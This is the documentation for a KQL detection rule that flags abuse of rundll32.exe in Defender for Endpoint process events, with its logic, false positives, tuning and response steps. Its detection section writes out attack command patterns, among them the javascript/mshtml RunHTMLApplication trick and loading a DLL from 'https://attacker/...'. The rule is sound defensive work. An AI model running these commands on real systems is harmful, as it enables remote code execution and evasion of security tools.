# rundll32.exe with unusual command line

- **Query file:** `T1218.011_rundll32-unusual-cmdline.kql`
- **Author:** nextlayersec
- **Last updated:** 2026-06-08
- **Status:** testing
- **Severity:** Medium baseline; auto-raise to High on protocol-handler / UNC-or-HTTP / world-writable + non-Microsoft parent.

## What it detects

`rundll32.exe` invoked with one of the high-fidelity abuse patterns — not normal Windows behavior:

- **Protocol-handler bridge:** `javascript:` / `vbscript:` / `data:` / `mshtml,RunHTMLApplication` / `url.dll,FileProtocolHandler` / `url.dll,OpenURL`. The classic `rundll32 javascript:"\..\mshtml,RunHTMLApplication "` trick that loads attacker-controlled JScript into the trusted process is captured here.
- **UNC or HTTP DLL path:** `rundll32 \\server\share\foo.dll,Entry` or `rundll32 https://attacker/foo.dll,Entry` — Windows happily resolves both.
- **DLL loaded from a world-writable path** (`\Users\*\AppData\`, `\Users\Public\`, `\ProgramData\`, `\Windows\Temp\`, `\Temp\`, `%TEMP%`, `%TMP%`).
- **Disguised payload extension** (`.tmp` / `.dat` / `.log` / `.png` / `.jpg` / `.ico` / `.pdf` / `.txt` / `.zip` / `.bin` / `.rar`) — common malware drop pattern that hopes a downstream binary-rule misses it.
- **rundll32 launched with NO command-line arguments** — the canonical process-hollowing target when the parent is unusual.

Each pattern is tagged as a separate `B_*` boolean column so SOC analysts can pivot quickly, and the `RiskScore` + `Severity` columns roll them up.

## Data sources

| Source | Table | Required event(s) |
|---|---|---|
| Defender for Endpoint | `DeviceProcessEvents` | Process create with `FileName`, `ProcessCommandLine`, `InitiatingProcessFileName`, `InitiatingProcessFolderPath`, `InitiatingProcessCommandLine` |

**Minimum connectors:** Defender for Endpoint Plan 1+ (any of the M365 Business Premium / E3 / E5 onboard paths). Runs natively in Defender XDR advanced hunting. In Sentinel, the same table is available once the **Microsoft Defender XDR** data connector is enabled.

**Sysmon equivalent:** Event ID 1 (`ProcessCreate`) — same fields under different names (`Image`, `CommandLine`, `ParentImage`, `ParentCommandLine`). Translate `FileName =~ "rundll32.exe"` → `Image|endswith: '\rundll32.exe'`.

**Recommended retention:** 30 days (Defender XDR advanced-hunting default).

## Logic

1. **Scope** — `DeviceProcessEvents` where `FileName =~ "rundll32.exe"` over `lookback`.
2. **Tag five suspicious patterns** as independent boolean columns:
   - `B_Protocol` — command line contains any item from the `evilProtocols` list.
   - `B_UNCorHTTP` — command line is `rundll32 \\…` or `rundll32 http(s)://…` (regex).
   - `B_Writable` — command line references any path in the `worldWritable` list.
   - `B_WeirdExt` — the first positional argument's extension is in the `weirdExt` list.
   - `B_NoArgs` — the command line is *just* `rundll32` / `rundll32.exe`.
3. **Filter** — keep rows where at least one tag is set.
4. **Drop known-legit parents** — `explorer.exe`, `svchost.exe`, `services.exe`, `taskhostw.exe`, `msiexec.exe`, `wuauclt.exe`, `spoolsv.exe`, `setup.exe`, `control.exe`, `mmc.exe`, `shellhostex.exe`, `sihost.exe` — but ONLY when the only fired flag is `B_WeirdExt` or `B_NoArgs`. Protocol / UNC / world-writable patterns are suspicious from any parent.
5. **Score + severity dial:**
   - `RiskScore = 3·B_Protocol + 3·B_UNCorHTTP + 2·B_Writable + 2·B_WeirdExt + B_NoArgs`
   - `Severity = High` if `B_Protocol` or `B_UNCorHTTP` is set, or if `B_Writable` is set with a non-legit parent. Otherwise `Medium`.

## False positives

- **Printer / network UI plumbing** — `rundll32 shell32.dll,Control_RunDLL <path-to-cpl>` for a legitimate `.cpl` from `\Windows\System32\`. Handled by the parent allowlist (typically launched by `control.exe` / `explorer.exe`).
- **Old vendor agents** — some printer / VPN / endpoint tools still register Run-key entries that invoke `rundll32`. Add to the `knownLegitParents` list **only** after verifying the binary is signed and the parent path is in `\Program Files\`.
- **Software installers / removers** — `msiexec.exe` and legitimate `setup.exe` parents are allowlisted by default; if a custom installer pattern fires, sign-check it before broadening the allowlist.
- **`B_NoArgs` false positives** — `rundll32` with no args is extremely rare in normal operation but can appear during AV inspection or sandboxing. If your AV creates these, allowlist the AV's parent image rather than dropping `B_NoArgs`.

## Tuning

- **Signer allowlist (recommended upgrade).** Replace `knownLegitParents` with a join on `DeviceFileCertificateInfo` filtering by `IsTrusted == true` AND signer organization `contains "Microsoft"` / your-vendor. Fewer false negatives, less maintenance.
- **Add an `ImagePath in System32` clause** if you only want to flag rundll32 launches whose binary is NOT the legitimate one (rare but possible — some malware drops a copy of rundll32 into a writable folder).
- **`B_NoArgs` precision lever** — tighten to "no-args AND parent NOT in `knownLegitParents`" to drop the AV-inspection noise without losing the hollowing signal.
- **Volume tuning** — `B_Writable` is the loudest of the five branches. If your fleet has Click-to-Run apps or browser plugins that legitimately ship rundll32 calls into `\AppData\`, build a per-publisher allowlist.
- **Threshold dial** — surface `Severity == "High"` to the SOC queue, log `Severity == "Medium"` to a lower-priority hunting bucket.

## Output-data sensitivity

The `project` clause exports `ParentCmd` and `ChildCmd` — both full process command lines. These can legitimately contain user paths (`\Users\<username>\…`) and occasionally embedded credentials in command-line tooling (e.g., `--password=…` patterns) if any of your fleet's automation passes secrets on the command line. If your alert pipeline forwards alerts to recipients without need-to-know controls, consider trimming `ChildCmd` to the first 256 characters or hashing it, and let analysts pull the raw row from `DeviceProcessEvents` on demand.

## Response

1. **Pivot on the parent process tree.** The interesting question is not "what did rundll32 do" — it's "what spawned rundll32 with this argument". Walk `InitiatingProcessParentFileName` and the surrounding `DeviceProcessEvents` for the same `DeviceName` ± 5 minutes.
2. **Snapshot the DLL.** If `B_Writable` or `B_WeirdExt` fired, retrieve the DLL file before it self-deletes. Use Defender for Endpoint's **Collect investigation package** action or live-response `getfile`.
3. **Hunt the same hash fleet-wide** with `DeviceFileEvents` / `DeviceImageLoadEvents`.
4. **Network pivot.** If `B_UNCorHTTP` fired, immediately query `DeviceNetworkEvents` for the destination — there's almost certainly C2 traffic adjacent.
5. **Containment.** Defender for Endpoint **Isolate device** action; preserve the `\AppData\` tree for forensics before the device reboots.
6. **Record** the case in your internal incident tracker; cross-link any `T1547.001` Run-key hits from the same device since rundll32 is a common Run-key target.
